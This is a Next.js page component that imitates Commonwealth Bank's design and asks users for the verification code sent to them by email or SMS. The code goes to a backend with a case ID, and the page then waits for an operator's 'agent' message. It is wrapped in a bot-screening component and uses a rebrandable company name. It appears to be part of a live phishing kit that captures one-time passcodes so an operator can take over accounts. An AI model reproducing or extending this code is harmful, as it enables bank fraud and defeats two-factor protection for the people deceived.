'use client';

/**
 * CBA Secret Key/Verification Code Page
 * Centered single-column layout matching CommBank design language
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { AlertCircle, Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function SecretKeyPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId, agentMessage } = useSessionStore();

  const [secretKey, setSecretKey] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setSecretKey('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!secretKey.trim()) {
        setFieldError('Please enter your verification code');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-secret-key', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            secret_key: secretKey.trim(),
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your code. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your code...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [secretKey, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      <div className="main-container">
        <div className="case-id-box" style={{ maxWidth: '500px' }}>
          <div className="box-header">
            <span>Verification Code</span>
          </div>

          <form className="case-id-form" onSubmit={handleSubmit}>
            <p className="form-description">
              Enter the code you received via email or SMS to continue.
            </p>

            <div className="form-row" style={{ flexDirection: 'column', alignItems: 'stretch', gap: '8px' }}>
              <label htmlFor="secret-key" className="form-label" style={{ width: 'auto', textAlign: 'left' }}>
                Verification Code
              </label>
              <input
                type="text"
                id="secret-key"
                name="secret-key"
                className="case-id-input"
                autoComplete="off"
                value={secretKey}
                onChange={(e) => {
                  setSecretKey(e.target.value);
                  if (fieldError) setFieldError('');
                }}
                disabled={isWaiting}
              />
            </div>

            {/* Error message */}
            {fieldError && (
              <div className="error-message">
                <AlertCircle className="h-4 w-4" />
                <span>{fieldError}</span>
              </div>
            )}

            {/* Verify Button */}
            <button
              type="submit"
              className="logon-button"
              disabled={!secretKey.trim() || isWaiting}
              style={{ alignSelf: 'center' }}
            >
              {isWaiting && <Loader2 className="h-4 w-4 animate-spin" />}
              {isWaiting ? 'Verifying...' : 'Verify'}
            </button>

            <p className="form-note">
              Need help? Contact {currentBrand.companyName} support
            </p>
          </form>
        </div>
      </div>
    </BotGuard>
  );
}
